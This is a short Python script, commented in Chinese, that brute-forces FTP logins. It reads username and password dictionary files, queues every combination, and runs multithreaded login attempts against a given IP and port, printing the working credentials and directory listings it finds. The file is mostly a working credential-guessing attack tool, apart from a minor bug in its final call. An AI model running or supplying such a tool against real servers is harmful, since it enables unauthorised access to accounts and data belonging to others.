import ftplib
import sys
import threading#多线程
import queue#多线程
#模拟登录
'''
ftp =  ftplib.FTP()
ftp.connect('192.168.133.1',21)
ftp.login("ftp_test","test")
list = ftp.retrlines('list')
print(list)
'''
#爆破：IP，端口，用户名，密码字典
def ftp_burte(ip,port):
    ftp =  ftplib.FTP()
    ftp.connect(ip,int(port))
    while not q.empty():
        dict = q.get()
        dict =dict.split('|')
        username = dict[0]
        password = dict[1]
        try:
            ftp.login(username,password)
            list = ftp.retrlines('list')
            print(username+'|'+password+'|'+'ok')
            print(list)
        except ftplib.all_errors:
            print(username+'|'+password+'|'+'no')
            pass        
if __name__  ==  '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    userfile = sys.argv[3]
    passwordfile = sys.argv[4]
    threading_num = sys.argv[5]#线程数
    q=queue.Queue()#构造队列
    for username in open(userfile):
        for password in open(passwordfile):
            username = username.replace('\n','')
            password = password.replace('\n','')
            dict = username+'|'+password
            q.put(dict)#传送队列

    for x in range(int(threading_num)):#多线程
        t = threading.Thread(target=ftp_burte,args=(ip,int(port)))#args为元组形式
        t.start()
    ftp_burte()